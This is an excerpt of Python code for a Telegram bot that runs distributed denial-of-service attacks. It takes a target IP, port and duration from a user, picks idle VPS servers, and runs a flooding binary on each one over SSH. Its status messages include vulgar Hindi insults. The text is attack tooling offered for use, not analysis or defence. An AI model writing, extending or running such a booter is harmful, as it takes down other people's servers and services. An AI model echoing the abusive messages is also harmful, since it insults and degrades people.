...
async def attack_input(update: Update, context: CallbackContext):
    ...
    # Check if we have any VPS available
    ...
    if not available_vps:
        busy_list = "\n".join(set(busy_vps)) if busy_vps else "None"
        await update.message.reply_text(
            f"❌ *No VPS available! All VPS are currently busy.*\n\n"
    ...
    selected_vps_ips = available_vps
    ...
    running_attacks[attack_id] = {
        ...
        'threads': threads  # Store threads used for reporting
    }
    ...
    vps_list_text = "\n".join(f"🌐 VPS {i+1}: `{vps_ip}`" for i, vps_ip in enumerate(selected_vps_ips))
    
    await update.message.reply_text(
        f"{attack_type}\n"
        f"🎯 *Target*: {ip}:{port}\n"
        f"🕒 *Duration*: {duration} sec\n"
        f"🧵 *Auto Threads*: {threads}\n"
        f"🖥️ *Using {len(selected_vps_ips)} VPS servers*\n"
        f"👑 *Bot Owner:* {current_display_name}\n\n"
        f"🔥 *haters KI MUMMY CHODNA CHALU HO GY HA! 💥*",
        parse_mode='Markdown'
    )
        ...
        try:
            ...
            if selected_vps:
                try:
                    ...
                    # Add randomization to the attack command
                    command = f"{BINARY_PATH} {ip} {port} {duration} {random.randint(512, 1024)} {threads}"
                    stdin, stdout, stderr = ssh.exec_command(command)
                    
                    # Wait for command to complete or timeout
                    start_time = time.time()
                    while time.time() - start_time < duration + 15:  # Add buffer time
    ...
    async def run_attack():
        # Run attacks on all selected VPS in parallel
        ...
        result_details = []
        for vps_ip, success, error in results:
            if success:
                result_details.append(f"✅ {vps_ip} - Attack successful")
            else:
                result_details.append(f"❌ {vps_ip} - Failed: {error}")
        ...
        await update.message.reply_text(
            ...
            f"🖥️ *VPS Used*: {len(selected_vps_ips)}\n"
            f"✅ *Success*: {success_count}\n"
            f"❌ *Failed*: {fail_count}\n\n"
            f"📝 *Details:*\n" + "\n".join(result_details) + "\n\n"
            f"👑 *Bot Owner:* {current_display_name}\n\n"
            f"🔥 * HATERS KI MAA KI CHUT.*",
            parse_mode='Markdown'
        )
